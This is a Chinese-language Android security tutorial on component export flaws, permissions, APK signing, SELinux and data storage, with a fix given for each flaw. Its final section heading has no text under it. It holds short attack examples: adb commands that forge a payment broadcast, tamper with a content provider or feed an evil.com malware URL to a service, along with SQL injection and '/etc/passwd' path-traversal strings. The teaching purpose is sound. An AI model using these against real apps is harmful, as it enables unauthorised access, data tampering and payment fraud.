# Android 安全基础

> 本文档详细介绍 Android 平台的安全机制、常见漏洞类型和防护方案，包含实际案例与代码示例。

---

## 一、Android 系统架构

### 1.1 四层架构详解

Android 系统采用分层架构设计，从上到下分为四层：

```
┌─────────────────────────────────────────┐
│           应用层 (Applications)          │  ← 系统应用 + 第三方应用
├─────────────────────────────────────────┤
│       应用框架层 (Application Framework) │  ← Java API 框架
├─────────────────────────────────────────┤
│        系统运行库层 (Libraries)          │  ← Native 库 + Android Runtime
├─────────────────────────────────────────┤
│         Linux 内核层 (Linux Kernel)      │  ← 驱动 + 核心服务
└─────────────────────────────────────────┘
```

#### 第一层：应用层 (Applications)
- **位置**：最顶层
- **内容**：系统自带应用（电话、短信、通讯录、浏览器等）和用户安装的第三方应用
- **运行环境**：每个应用运行在独立的 Dalvik/ART 虚拟机实例中
- **安全意义**：应用层是用户直接交互的层面，也是漏洞最集中的层面

#### 第二层：应用框架层 (Application Framework)
- **位置**：应用层之下
- **核心组件**：
  - **Activity Manager**：管理 Activity 生命周期和任务栈
  - **Window Manager**：管理窗口系统
  - **Content Providers**：跨应用数据共享
  - **View System**：UI 控件体系
  - **Package Manager**：应用包管理
  - **Telephony Manager**：电话相关服务
  - **Resource Manager**：资源管理
  - **Location Manager**：位置服务
  - **Notification Manager**：通知管理
- **安全意义**：框架层提供了应用间通信的机制，也是权限控制的核心层

#### 第三层：系统运行库层 (Libraries)
- **位置**：框架层之下，分为两部分：

**Native C/C++ 库**：
- **Surface Manager**：显示系统管理
- **Media Framework**：多媒体框架（基于 PacketVideo）
- **SQLite**：轻量级数据库
- **OpenGL ES**：3D 图形渲染
- **FreeType**：字体渲染
- **WebKit**：浏览器引擎
- **SGL**：2D 图形引擎
- **SSL**：安全套接层
- **libc**：标准 C 库

**Android Runtime (ART)**：
- 核心库（Core Libraries）：提供 Java 核心 API
- ART 虚拟机：执行 DEX 字节码，采用 AOT（预编译）+ JIT（即时编译）混合模式
- 取代了旧版的 Dalvik 虚拟机（Android 5.0 之前）

**安全意义**：Native 层漏洞（如缓冲区溢出）可能导致权限提升

#### 第四层：Linux 内核层 (Linux Kernel)
- **位置**：最底层
- **核心功能**：
  - **进程管理**：基于 Linux 的进程模型
  - **内存管理**：虚拟内存、内存映射
  - **文件系统**：ext4、F2FS 等
  - **设备驱动**：显示驱动、摄像头驱动、音频驱动、蓝牙驱动、WiFi 驱动、Binder 驱动等
  - **网络协议栈**：TCP/IP 协议栈
  - **安全机制**：SELinux、权限隔离

**安全意义**：内核漏洞是权限提升和 Root 的关键

### 1.2 系统启动流程

```
Boot ROM → Bootloader → Kernel → init → Zygote → SystemServer → 系统应用 → Launcher
```

各阶段安全要点：
- **Bootloader**：负责验证内核镜像完整性，防止刷机攻击
- **Kernel**：启动 SELinux、加载驱动、挂载文件系统
- **Zygote**：孵化所有应用进程的母体进程，初始化 ART 虚拟机
- **SystemServer**：启动所有系统服务（ActivityManagerService、PackageManagerService 等）

---

## 二、四大组件安全

### 2.1 Activity 组件安全

#### 什么是 Activity
Activity 是 Android 应用中负责与用户交互的界面组件，每个 Activity 对应一个屏幕界面。

#### Activity 导出漏洞

**漏洞原理**：如果 Activity 在 AndroidManifest.xml 中设置了 `android:exported="true"`，或者设置了 `<intent-filter>`（默认导出），则其他应用可以直接启动该 Activity，可能导致越权访问。

**漏洞示例（AndroidManifest.xml）**：
```xml
<!-- 危险：显式设置导出 -->
<activity
    android:name=".PayActivity"
    android:exported="true">
</activity>

<!-- 危险：设置了 intent-filter 默认导出 -->
<activity android:name=".UserInfoActivity">
    <intent-filter>
        <action android:name="com.example.VIEW_USERINFO" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

**攻击方式**：
```bash
# 使用 adb 命令启动导出的 Activity
adb shell am start -n com.example/.PayActivity
adb shell am start -a com.example.VIEW_USERINFO --es userid admin
```

**漏洞危害**：
- 绕过登录直接访问敏感页面
- 越权查看其他用户信息
- 执行敏感操作（支付、修改密码等）

**修复方案**：
```xml
<!-- 方案1：不需要对外的 Activity 设置为不导出 -->
<activity
    android:name=".PayActivity"
    android:exported="false">
</activity>

<!-- 方案2：必须导出的 Activity 添加权限校验 -->
<activity
    android:name=".ShareActivity"
    android:exported="true"
    android:permission="com.example.permission.SHARE">
    <intent-filter>
        <action android:name="com.example.SHARE" />
    </intent-filter>
</activity>
```

**代码层面的二次校验**：
```java
public class PayActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 校验调用者是否为内部应用
        String callingPackage = getCallingPackage();
        if (callingPackage != null && !callingPackage.equals(getPackageName())) {
            // 外部应用调用，拒绝访问
            finish();
            return;
        }
        
        // 校验用户登录状态
        if (!UserManager.isLoggedIn()) {
            // 未登录，跳转到登录页
            startActivity(new Intent(this, LoginActivity.class));
            finish();
            return;
        }
        
        setContentView(R.layout.activity_pay);
    }
}
```

### 2.2 Service 组件安全

#### 什么是 Service
Service 是 Android 中后台运行的组件，用于执行不需要用户界面的长期操作。

#### Service 导出漏洞

**漏洞示例**：
```xml
<service
    android:name=".DownloadService"
    android:exported="true">
    <intent-filter>
        <action android:name="com.example.DOWNLOAD" />
    </intent-filter>
</service>
```

**攻击方式**：
```bash
# 启动导出的服务
adb shell am startservice -a com.example.DOWNLOAD --es url "http://evil.com/malware.apk"

# 绑定服务调用方法
adb shell am broadcast -a ...
```

**漏洞危害**：
- 恶意应用调用服务执行敏感操作
- 下载恶意文件、上传用户数据
- 绕过业务逻辑限制

**修复方案**：
```xml
<service
    android:name=".DownloadService"
    android:exported="false">
</service>

<!-- 必须导出的服务添加自定义权限 -->
<service
    android:name=".PushService"
    android:exported="true"
    android:permission="com.example.permission.PUSH_SERVICE" />
```

### 2.3 BroadcastReceiver 组件安全

#### 什么是 BroadcastReceiver
BroadcastReceiver（广播接收器）是 Android 中用于监听系统或应用广播消息的组件。

#### 广播类型
| 类型 | 说明 | 安全风险 |
|------|------|----------|
| 普通广播 (Normal Broadcast) | 异步发送，所有接收器同时接收 | 可能被截获 |
| 有序广播 (Ordered Broadcast) | 按优先级顺序接收，可截断 | 可能被劫持/篡改 |
| 粘性广播 (Sticky Broadcast) | 广播后保留，可被后续注册者获取 | 已废弃，不安全 |
| 本地广播 (LocalBroadcast) | 仅应用内传播 | 相对安全 |

#### 导出漏洞案例

**漏洞示例**：
```xml
<receiver
    android:name=".BootReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>

<!-- 自定义广播接收器，导出且无权限保护 -->
<receiver android:name=".PaymentReceiver">
    <intent-filter>
        <action android:name="com.example.PAYMENT_RESULT" />
    </intent-filter>
</receiver>
```

**攻击方式 - 广播劫持**：
```bash
# 伪造支付成功广播
adb shell am broadcast -a com.example.PAYMENT_RESULT --ez success true --es orderid "12345"
```

**攻击方式 - 广播窃听**：
- 恶意应用注册相同 Action 的广播接收器
- 对于有序广播，高优先级接收器可以截断或修改结果

**修复方案**：
```xml
<!-- 方案1：设置为不导出 -->
<receiver
    android:name=".PaymentReceiver"
    android:exported="false">
    <intent-filter>
        <action android:name="com.example.PAYMENT_RESULT" />
    </intent-filter>
</receiver>

<!-- 方案2：添加自定义权限保护 -->
<receiver
    android:name=".PaymentReceiver"
    android:exported="true"
    android:permission="com.example.permission.PAYMENT_BROADCAST">
    <intent-filter>
        <action android:name="com.example.PAYMENT_RESULT" />
    </intent-filter>
</receiver>

<!-- 方案3：代码中动态注册（应用内使用本地广播） -->
```

**推荐使用 LocalBroadcastManager**：
```java
// 发送本地广播
LocalBroadcastManager manager = LocalBroadcastManager.getInstance(context);
Intent intent = new Intent("com.example.PAYMENT_RESULT");
intent.putExtra("success", true);
manager.sendBroadcast(intent);

// 注册本地广播接收器
manager.registerReceiver(receiver, new IntentFilter("com.example.PAYMENT_RESULT"));
```

### 2.4 ContentProvider 组件安全

#### 什么是 ContentProvider
ContentProvider 是 Android 中用于跨应用共享数据的组件，提供统一的数据访问接口（CRUD 操作）。

#### 导出漏洞案例

**漏洞示例**：
```xml
<provider
    android:name=".UserContentProvider"
    android:authorities="com.example.user.provider"
    android:exported="true">
</provider>
```

**攻击方式**：
```bash
# 查询用户数据
adb shell content query --uri content://com.example.user.provider/users

# 插入恶意数据
adb shell content insert --uri content://com.example.user.provider/users \
    --bind name:s:hacker --bind password:s:123456

# 删除数据
adb shell content delete --uri content://com.example.user.provider/users \
    --where "name='admin'"
```

**SQL 注入风险**：
```java
// 危险：直接拼接用户输入到 SQL 语句
public Cursor query(Uri uri, String[] projection, String selection, 
                    String[] selectionArgs, String sortOrder) {
    SQLiteDatabase db = dbHelper.getReadableDatabase();
    // selection 可被注入："1=1 DROP TABLE users --"
    return db.rawQuery("SELECT * FROM users WHERE " + selection, null);
}
```

**路径遍历风险**：
```java
// 危险：直接使用用户输入的文件名
private File getFile(String filename) {
    // filename = "../../../etc/passwd" 可导致路径遍历
    return new File(Environment.getExternalStorageDirectory(), filename);
}
```

**修复方案**：
```xml
<!-- 设置为不导出 -->
<provider
    android:name=".UserContentProvider"
    android:authorities="com.example.user.provider"
    android:exported="false">
</provider>

<!-- 添加权限保护（读写权限分离） -->
<provider
    android:name=".UserContentProvider"
    android:authorities="com.example.user.provider"
    android:exported="true"
    android:readPermission="com.example.permission.READ_USER"
    android:writePermission="com.example.permission.WRITE_USER">
</provider>

<!-- 启用 grantUriPermissions 精细控制 -->
<provider
    android:name=".FileProvider"
    android:authorities="com.example.fileprovider"
    android:exported="false"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/file_paths" />
</provider>
```

**代码层面防护**：
```java
public Cursor query(Uri uri, String[] projection, String selection, 
                    String[] selectionArgs, String sortOrder) {
    SQLiteDatabase db = dbHelper.getReadableDatabase();
    
    // 使用参数化查询，防止 SQL 注入
    return db.query("users", projection, selection, selectionArgs, 
                    null, null, sortOrder);
}
```

### 2.5 Intent 注入漏洞

**漏洞原理**：应用使用外部传入的 Intent 直接启动组件，攻击者可以构造恶意 Intent 访问私有组件。

**漏洞代码**：
```java
// 危险：直接使用外部 Intent
Intent intent = getIntent();
String targetAction = intent.getStringExtra("action");
Intent targetIntent = new Intent(targetAction);
startActivity(targetIntent);  // 可能启动任意导出组件
```

**修复方案**：
```java
// 方案：使用 Intent 选择器或显式指定组件
Intent intent = new Intent();
intent.setClassName(getPackageName(), "com.example.LoginActivity");
startActivity(intent);
```

---

## 三、Android 权限机制

### 3.1 权限分类

| 级别 | 说明 | 示例 | 申请方式 |
|------|------|------|----------|
| 正常权限 (Normal) | 不涉及用户隐私，系统自动授予 | 网络访问、蓝牙、震动 | 清单声明即可 |
| 危险权限 (Dangerous) | 涉及用户隐私，需用户授权 | 定位、相机、通讯录、存储 | 运行时申请 |
| 特殊权限 (Special) | 特殊功能，需用户在设置中开启 | 悬浮窗、无障碍、修改系统设置 | 跳转设置页面 |
| 签名权限 (Signature) | 只有相同签名的应用才能获得 | 自定义签名级权限 | 相同签名自动授予 |

### 3.2 危险权限分组（运行时权限）

Android 6.0 (API 23) 引入运行时权限机制，危险权限需要在运行时动态申请。

```
日历 (CALENDAR)         → READ_CALENDAR, WRITE_CALENDAR
相机 (CAMERA)           → CAMERA
通讯录 (CONTACTS)       → READ_CONTACTS, WRITE_CONTACTS, GET_ACCOUNTS
位置 (LOCATION)         → ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION
麦克风 (MICROPHONE)     → RECORD_AUDIO
电话 (PHONE)            → READ_PHONE_STATE, CALL_PHONE, READ_CALL_LOG 等
传感器 (SENSORS)        → BODY_SENSORS
短信 (SMS)              → SEND_SMS, RECEIVE_SMS, READ_SMS 等
存储 (STORAGE)          → READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE
```

### 3.3 权限声明

**AndroidManifest.xml 中的声明**：
```xml
<!-- 正常权限：安装时自动授予 -->
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

<!-- 危险权限：需要运行时申请 -->
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.CAMERA" />

<!-- 自定义权限 -->
<permission
    android:name="com.example.permission.ACCESS_API"
    android:protectionLevel="signature"
    android:label="访问 API 权限" />
```

### 3.4 运行时权限申请（代码示例）

```java
public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CAMERA_PERMISSION = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 检查是否已授权
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            // 申请权限
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.CAMERA},
                    REQUEST_CAMERA_PERMISSION);
        } else {
            // 已授权，执行业务逻辑
            openCamera();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
            @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CAMERA_PERMISSION) {
            if (grantResults.length > 0
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // 用户同意授权
                openCamera();
            } else {
                // 用户拒绝授权
                if (ActivityCompat.shouldShowRequestPermissionRationale(
                        this, Manifest.permission.CAMERA)) {
                    // 用户拒绝但未勾选"不再询问"，解释权限用途
                    showPermissionRationale();
                } else {
                    // 用户勾选了"不再询问"，引导用户去设置页开启
                    showGoToSettingsDialog();
                }
            }
        }
    }
}
```

### 3.5 权限提升漏洞

**常见权限提升场景**：
1. **组件导出 + 隐式 Intent**：通过导出组件间接调用受限组件
2. **ContentProvider 路径遍历**：通过 ContentProvider 访问受限文件
3. **PendingIntent 误用**：使用外部可控的 Intent 构造 PendingIntent
4. **自定义权限保护级别过低**：使用 normal 级别保护敏感功能

**PendingIntent 误用案例**：
```java
// 危险：baseIntent 来自外部，可能被利用
Intent baseIntent = getIntent().getParcelableExtra("callback");
PendingIntent pendingIntent = PendingIntent.getActivity(
        this, 0, baseIntent, PendingIntent.FLAG_UPDATE_CURRENT);
// 攻击者可构造指向私有组件的 Intent，通过 PendingIntent 绕过权限
```

**修复方案**：
```java
// 使用显式 Intent，限定包名
Intent safeIntent = new Intent();
safeIntent.setClassName(getPackageName(), "com.example.CallbackActivity");
PendingIntent pendingIntent = PendingIntent.getActivity(
        this, 0, safeIntent, PendingIntent.FLAG_UPDATE_CURRENT | 
        PendingIntent.FLAG_IMMUTABLE);
```

---

## 四、APK 文件结构详解

### 4.1 APK 整体结构

APK（Android Package）本质上是一个 ZIP 格式的压缩包，可以直接用解压工具打开。

```
App.apk
├── AndroidManifest.xml      # 清单文件（二进制格式）
├── classes.dex              # Dalvik/ART 字节码（主 dex）
├── classes2.dex             # 多 dex 情况下的其他 dex
├── resources.arsc           # 资源索引表（二进制格式）
├── res/                     # 资源文件
│   ├── drawable/            # 图片资源
│   ├── layout/              # 布局文件（二进制 XML）
│   ├── values/              # 字符串、颜色、尺寸等
│   ├── mipmap-xxxhdpi/      # 图标资源
│   └── ...
├── lib/                     # Native 库
│   ├── armeabi-v7a/         # 32 位 ARM 架构
│   │   ├── libnative.so
│   │   └── libssl.so
│   ├── arm64-v8a/           # 64 位 ARM 架构
│   │   └── libnative.so
│   ├── x86/                 # 32 位 x86 架构
│   └── x86_64/              # 64 位 x86 架构
├── assets/                  # 资产文件（原始文件，不编译）
│   ├── config.json
│   ├── web/
│   └── ...
├── META-INF/                # 签名信息目录
│   ├── MANIFEST.MF          # 文件摘要清单
│   ├── CERT.SF              # 签名文件
│   └── CERT.RSA             # 签名证书（含公钥）
└── Kotlin/                  # Kotlin 元数据（Kotlin 应用才有）
```

### 4.2 各文件详细说明

#### AndroidManifest.xml
- **格式**：二进制 XML（AXML 格式）
- **内容**：应用包名、版本号、权限声明、四大组件声明、SDK 版本要求等
- **分析工具**：Apktool（反编译为文本 XML）、axmlprinter、AndroidManifest.xml 解析器

#### classes.dex
- **格式**：Dalvik Executable 格式
- **内容**：应用的 Java/Kotlin 代码编译后的 Dalvik 字节码
- **特点**：
  - 基于寄存器的虚拟机指令集（与 JVM 基于栈不同）
  - 多 dex 机制：方法数超过 65536 时会分包（classes2.dex、classes3.dex...）
- **分析工具**：JADX、JEB、IDA Pro、baksmali

#### resources.arsc
- **格式**：二进制资源表
- **内容**：所有资源的 ID 映射、字符串池、配置信息等
- **作用**：系统通过资源 ID 快速查找对应资源

#### res/ 目录
- **drawable/**：图片、形状等可绘制资源
- **layout/**：界面布局文件（二进制 XML）
- **values/**：字符串（strings.xml）、颜色（colors.xml）、尺寸（dimens.xml）等
- **mipmap-*/**：应用图标（不同分辨率）
- **xml/**：XML 配置文件（如文件路径配置、网络安全配置）
- **raw/**：原始资源文件（不编译，可通过 R.raw.xxx 访问）

#### lib/ 目录
- 存放不同 CPU 架构的 Native 动态库（.so 文件）
- 常见架构：armeabi-v7a、arm64-v8a、x86、x86_64
- 系统会根据设备架构自动选择对应目录的 so 文件
- 分析工具：IDA Pro、Ghidra、Hopper

#### assets/ 目录
- 存放原始资源文件，保持原样打包
- 不生成资源 ID，通过 AssetManager 访问
- 常用于存放 HTML、字体、配置文件、数据库文件等
- 路径遍历漏洞的高发区

#### META-INF/ 目录
- **MANIFEST.MF**：列出 APK 中所有文件的 SHA-1 摘要
- **CERT.SF**：对 MANIFEST.MF 的签名
- **CERT.RSA**：包含签名证书（公钥）和对 CERT.SF 的数字签名
- 注意：v2/v3 签名信息不在此目录中，而是在 APK 的签名块中

---

## 五、Android 签名机制

### 5.1 v1 签名（JAR 签名）

**原理**：基于 JAR 签名方案，对 APK 中的每个文件单独计算摘要。

**签名流程**：
1. 对 APK 中每个文件计算 SHA-1 摘要，写入 MANIFEST.MF
2. 对 MANIFEST.MF 中的每个条目再计算摘要，写入 CERT.SF
3. 使用私钥对 CERT.SF 进行签名，结果和证书一起存入 CERT.RSA

**验证流程**：
1. 使用证书中的公钥验证 CERT.SF 的签名是否有效
2. 验证 CERT.SF 中的摘要与 MANIFEST.MF 是否匹配
3. 验证 MANIFEST.MF 中的摘要与实际文件内容是否匹配

**v1 签名的问题**：
- 只验证文件内容，不验证文件在 ZIP 中的结构
- 攻击者可以在不破坏签名的情况下修改 ZIP 结构（如添加额外文件）
- 验证速度慢，需要解压所有文件

### 5.2 v2 签名（APK Signature Scheme v2）

**原理**：对整个 APK 文件进行签名（Android 7.0+ 支持）。

**签名位置**：
```
┌─────────────────────────────────┐
│     ZIP 内容区（Content）        │  ← v1 签名验证的部分
├─────────────────────────────────┤
│   APK 签名块（APK Signing Block）│  ← v2/v3 签名数据
├─────────────────────────────────┤
│   ZIP 中央目录（Central Dir）    │
├─────────────────────────────────┤
│ ZIP 中央目录结束（EOCD）         │
└─────────────────────────────────┘
```

**签名流程**：
1. 将 APK 内容（ZIP 内容区 + 中央目录 + EOCD）分成多个 1MB 大小的块
2. 对每个块计算 SHA-256 摘要，组成摘要列表
3. 对摘要列表再计算摘要，得到整个 APK 的摘要
4. 使用私钥对摘要进行签名

**v2 签名的优势**：
- 验证速度快（不需要解压文件）
- 安全性更高（任何修改都会导致签名失效）
- 防篡改能力强

### 5.3 v3 签名（APK Signature Scheme v3）

**原理**：在 v2 的基础上增加了密钥轮换功能（Android 9.0+ 支持）。

**主要特性**：
- 支持签名密钥轮换（key rotation）
- 可以在 APK 中包含签名者的历史信息
- 应用更新时可以使用不同的签名密钥
- 提供签名者的证明链

### 5.4 签名验证优先级

Android 系统验证签名的优先级：
1. **v3 签名**（如果设备支持且 APK 包含 v3 签名）
2. **v2 签名**（如果设备支持且 APK 包含 v2 签名）
3. **v1 签名**（降级验证）

### 5.5 实际操作示例

**查看 APK 签名信息**：
```bash
# 使用 apksigner 工具（推荐）
apksigner verify --verbose app.apk

# 使用 jarsigner（仅能查看 v1 签名）
jarsigner -verify -verbose -certs app.apk

# 使用 keytool 查看证书
keytool -printcert -jarfile app.apk
```

**对 APK 进行签名**：
```bash
# 使用 apksigner 签名（支持 v1/v2/v3）
apksigner sign --ks keystore.jks \
    --ks-key-alias mykey \
    --v1-signing-enabled true \
    --v2-signing-enabled true \
    --v3-signing-enabled false \
    --out signed.apk unsigned.apk
```

### 5.6 签名绕过与二次打包

**二次打包流程**：
```
原始 APK → 反编译 → 修改代码/资源 → 重新打包 → 重新签名 → 安装运行
```

**防护措施**：
1. **签名校验**：运行时检查应用签名是否与预期一致
2. **完整性校验**：校验 dex 文件、so 文件的完整性
3. **加固保护**：使用加固服务增加破解难度

**签名校验代码示例**：
```java
public static boolean verifySignature(Context context) {
    try {
        PackageInfo packageInfo = context.getPackageManager()
                .getPackageInfo(context.getPackageName(),
                        PackageManager.GET_SIGNATURES);
        Signature[] signatures = packageInfo.signatures;
        
        // 计算签名的 hash 并与预期值比较
        String signatureHash = calculateHash(signatures[0].toByteArray());
        String expectedHash = "预期的签名哈希值";
        
        return expectedHash.equals(signatureHash);
    } catch (Exception e) {
        return false;
    }
}
```

---

## 六、沙箱与 SELinux

### 6.1 Android 沙箱机制

**核心原理**：每个 Android 应用都分配一个唯一的 UID（用户 ID），运行在独立的进程和虚拟机中，实现应用间的隔离。

#### UID 隔离
- 每个应用安装时被分配唯一的 UID（如 u0_a100）
- 应用进程以该 UID 运行
- 应用数据目录权限设置为仅该 UID 可访问

```bash
# 查看应用的 UID
adb shell dumpsys package com.example.app | grep userId
# 输出：userId=10123

# 查看应用进程
adb shell ps | grep com.example.app
# u0_a123   12345  1234  ...  com.example.app
```

#### 文件系统隔离
```
/data/data/com.example.app/     # 应用私有数据目录（仅应用自身可访问）
    ├── shared_prefs/           # SharedPreferences 存储
    ├── databases/              # SQLite 数据库
    ├── files/                  # 内部存储文件
    ├── cache/                  # 缓存目录
    └── ...

/sdcard/Android/data/com.example.app/   # 外部存储私有目录
    ├── files/
    └── cache/
```

#### 进程隔离
- 每个应用运行在独立的 Linux 进程中
- 每个应用拥有独立的 Dalvik/ART 虚拟机实例
- 应用间不能直接访问对方的内存空间

### 6.2 SELinux 基础

**SELinux**（Security-Enhanced Linux）是 Linux 内核的强制访问控制（MAC）安全模块，Android 从 4.3 开始引入。

#### SELinux 模式
| 模式 | 说明 |
|------|------|
| **Enforcing**（强制模式） | 拒绝违规操作并记录日志（生产环境） |
| **Permissive**（宽容模式） | 只记录日志，不拒绝操作（调试用） |
| **Disabled**（禁用） | 完全关闭 SELinux |

**查看 SELinux 状态**：
```bash
adb shell getenforce
# 输出：Enforcing

adb shell setenforce 0   # 设置为 Permissive（需 root）
adb shell setenforce 1   # 设置为 Enforcing
```

#### SELinux 上下文

每个进程、文件、设备都有 SELinux 上下文，格式为：
```
user:role:type:level
```

**常见上下文示例**：
```
# 进程上下文
u:r:untrusted_app:s0:c123,c256,c512,c768    # 第三方应用
u:r:system_app:s0                           # 系统应用
u:r:shell:s0                                # adb shell
u:r:init:s0                                 # init 进程

# 文件上下文
u:object_r:system_file:s0                   # 系统文件
u:object_r:app_data_file:s0:c123,c256...    # 应用数据
u:object_r:sdcard_file:s0                   # SD卡文件
```

#### SELinux 策略规则

SELinux 规则定义了哪个源类型（进程）可以对哪个目标类型（文件/设备）执行什么操作。

```
allow untrusted_app app_data_file:file { read write create };
```

含义：允许 `untrusted_app` 域的进程对 `app_data_file` 类型的文件执行读、写、创建操作。

#### SELinux 日志与分析

```bash
# 查看 SELinux 拒绝日志
adb shell dmesg | grep "avc: denied"

# 示例日志
# avc: denied { read } for pid=1234 comm="ExampleApp" name="secret.txt"
#     dev="mmcblk0p10" ino=12345 scontext=u:r:untrusted_app:s0:c123
#     tcontext=u:object_r:system_file:s0 tclass=file permissive=0
```

日志解读：
- **scontext**：源上下文（谁在操作）
- **tcontext**：目标上下文（操作什么）
- **tclass**：目标类别（file/dir/socket 等）
- **操作**：read/write/create/open 等
- **permissive=0**：处于 Enforcing 模式，操作被拒绝

### 6.3 沙箱绕过

常见的沙箱绕过手段：
1. **组件导出漏洞**：通过导出组件间接访问其他应用数据
2. **ContentProvider 漏洞**：SQL 注入、路径遍历
3. **符号链接攻击**：利用文件系统的符号链接越权访问
4. **权限提升漏洞**：利用系统漏洞提升到更高权限域
5. **内核漏洞**：利用内核漏洞实现 Root，完全绕过沙箱

---

## 七、数据存储安全

### 7.1 SharedPreferences 安全

#### 什么是 SharedPreferences
SharedPreferences 是 Android 提供的轻量级数据存储方式，以 XML 文件形式存储键值对。

#### 存储位置
```
/data/data/<package_name>/shared_prefs/<name>.xml
```

#### 安全风险

**风险1：MODE_WORLD_READABLE / MODE_WORLD_WRITEABLE**
```java
// 危险！其他应用可以读取/写入
SharedPreferences sp = getSharedPreferences("user_info",
        Context.MODE_WORLD_READABLE);
sp.edit().putString("password", "123456").apply();
```

**风险2：明文存储敏感信息**
```xml
<!-- /data/data/com.example/shared_prefs/user_info.xml -->
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="username">admin</string>
    <string name="password">123456</string>       <!-- 明文密码 -->
    <string name="token">eyJhbGciOiJIUzI1NiIs...</string>  <!-- 明文 token -->
</map>
```

**修复方案**：
```java
// 1. 使用 MODE_PRIVATE（默认）
SharedPreferences sp = getSharedPreferences("user_info",
        Context.MODE_PRIVATE);

// 2. 敏感数据加密存储
String encryptedPassword = AESUtils.encrypt("123456", getSecretKey());
sp.edit().putString("password", encryptedPassword).apply();
```

### 7.2 文件存储安全

#### 内部存储
```java
// 存储在 /data/data/<package>/files/ 目录
// 仅应用自身可访问
FileOutputStream fos = openFileOutput("data.txt", Context.MODE_PRIVATE);
fos.write(data.getBytes());
fos.close();
```

#### 外部存储（SD卡）
```java
// 存储在 /sdcard/ 或 /storage/emulated/0/ 目录
// 所有应用都可以访问（需存储权限）
File file = new File(Environment.getExternalStorageDirectory(), "data.txt");
```

**安全风险**：
- 外部存储上的文件对所有应用可见
- 卸载应用时不会自动删除
- 容易被恶意应用读取或篡改

**修复方案**：
```java
// 1. 敏感文件存储在内部存储
File internalFile = new File(getFilesDir(), "secret.txt");

// 2. 外部存储使用应用私有目录
File externalPrivate = new File(
        getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS),
        "data.txt");
// 路径：/sdcard/Android/data/<package>/files/Documents/data.txt
// 卸载应用时会自动删除

// 3. 文件内容加密
byte[] encryptedData = AESUtils.encrypt(data.getBytes(), key);
FileOutputStream fos = new FileOutputStream(file);
fos.write(encryptedData);
fos.close();
```

### 7.3 SQLite 数据库安全

#### 存储位置
```
/data/data/<package_name>/databases/<db_name>.db
```

#### 安全风险

**风险1：SQL 注入**
```java
// 危险：拼接 SQL 语句
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
Cursor cursor = db.rawQuery(sql, null);
// 攻击输入：admin' OR '1'='1
// 结果：返回所有用户数据
```

**风险2：数据库文件明文存储**
- Root 后的设备可以直接拷贝数据库文件
- 备份功能可能泄露数据库文件

**修复方案**：
```java
// 1. 使用参数化查询
Cursor cursor = db.query("users", 
        new String[]{"id", "username"},
        "username = ?", 
        new String[]{username},
        null, null, null);

// 2. 使用 SQLCipher 加密数据库
// 依赖：net.zetetic:android-database-sqlcipher
SQLiteDatabase.loadLibs(context);
String password = "database_password";
SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(databaseFile, password, null);
```

### 7.4 硬编码敏感信息

**漏洞示例**：
```java
public class ApiConfig {
    // 危险：硬编码 API 密钥
    public static final String API_KEY = "sk-abc123def456ghi789";
    public static final String SECRET = "my_secret_key_123";
    public static final String DB_PASSWORD = "db_pass_2024";
    
    // 危险：硬编码加密密钥
    private static final String AES_KEY = "0123456789abcdef";
}
```

**如何发现**：
- 反编译 APK 后搜索关键词（key、secret、password、token 等）
- 使用 strings 命令提取字符串
- 使用 MobSF 等工具自动扫描

**修复方案**：
```java
// 方案1：密钥从服务器获取，本地不存储
// 方案2：使用 Android Keystore 系统存储密钥
// 方案3：使用 NDK 将密钥藏在 Native 层
// 方案4：密钥分片存储，运行时组合
```

### 7.5 日志泄露

**漏洞示例**：
```java
// 危险：打印敏感信息到日志
Log.d("Login", "username: " + username + ", password: " + password);
Log.i("API", "token: " + token);
Log.e("Error", "Request data: " + requestBody);  // 请求体可能包含敏感数据
```

**查看日志**：
```bash
adb logcat | grep "Login"
```

**修复方案**：
```java
// 方案1：Release 版本禁用日志
public class LogUtils {
    private static final boolean DEBUG = BuildConfig.DEBUG;
    
    public static void d(String tag, String msg) {
        if (DEBUG) {
            Log.d(tag, msg);
        }
    }
}

// 方案2：ProGuard 移除 Log 调用（proguard-rules.pro）
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
}
```

---

## 八、通信安全

### 8.1 HTTPS 与证书校验

#### 为什么需要 HTTPS
- HTTP 明文传输，数据可被窃听和篡改
- HTTPS = HTTP + TLS/SSL，保证通信的机密性和完整性

#### 证书校验流程

```
客户端                          服务器
  │                              │
  │────── Client Hello ─────────▶│
  │◀───── Server Hello ──────────│
  │◀───── Certificate ───────────│  ← 服务器证书
  │◀───── Server Hello Done ─────│
  │                              │
  │  验证证书：                   │
  │  1. 证书是否在有效期内        │
  │  2. 证书域名是否匹配          │
  │  3. 证书是否由受信任的 CA 签发│
  │  4. 证书是否被吊销            │
  │                              │
  │────── Client Key Exchange ──▶│
  │────── Change Cipher Spec ───▶│
  │────── Finished ─────────────▶│
  │◀───── Change Cipher Spec ────│
  │◀───── Finished ──────────────│
  │                              │
  │────── 加密数据传输 ──────────▶│
```

### 8.2 常见证书校验漏洞

